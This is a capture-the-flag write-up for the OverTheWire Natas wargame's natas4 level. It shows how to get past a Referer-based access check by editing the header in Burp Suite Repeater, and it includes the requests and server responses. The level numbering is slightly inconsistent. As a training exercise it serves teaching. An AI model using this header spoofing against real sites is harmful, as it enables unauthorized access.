---
title: "Level 3 -> Level 4"
description: "Bypass a weak Referer header check by editing the request in Burp Suite."
date: 2026-09-09
platform: OverTheWire
game: Natas
level: "3 -> 4"
difficulty: Easy
category: Web
tags:
  - Web
  - HTTP Headers
  - Burp Suite
  - Beginner
---

## Challenge

Log in to Natas level 3 and locate the password for the next level.

```txt title="Credentials"
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```

## Enumeration

The first thing displayed on the page is:

```txt title="Initial response"
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

After pressing the refresh button, the message changes:

```txt title="After refreshing"
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

The page is checking the HTTP `Referer` header. When the browser refreshes the page, it sends the current page as the referrer, and the server reflects that value in the error message.

To test this, send the request to Burp Suite Repeater and change the `Referer` header to another value:

```http title="Request with test Referer"
GET /index.php HTTP/1.1
.
.
.
Referer: test
.
.
.
```

The response confirms that the server is reading the `Referer` value directly:

```txt title="Response"
Access disallowed. You are visiting from "test" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

## Exploitation

The page tells us exactly what referrer it expects:

```txt title="Required Referer"
http://natas5.natas.labs.overthewire.org/
```

Change the `Referer` header to that value in Burp Suite Repeater and resend the request:

```http title="Final request"
GET /index.php HTTP/1.1
.
.
.
Referer: http://natas5.natas.labs.overthewire.org/
.
.
.
```

This time the server grants access:

```txt title="Successful response"
Access granted. The password for natas5 is [Next Level Password]
```

The real password is intentionally omitted from this public writeup. Run the steps above to retrieve it yourself.

## Lessons learned

:::tip[Key takeaways]

- The `Referer` header is controlled by the client and can be modified.
- Do not treat headers such as `Referer` as a reliable authorization mechanism.
- Burp Suite Repeater is useful for quickly editing and resending HTTP requests.

:::
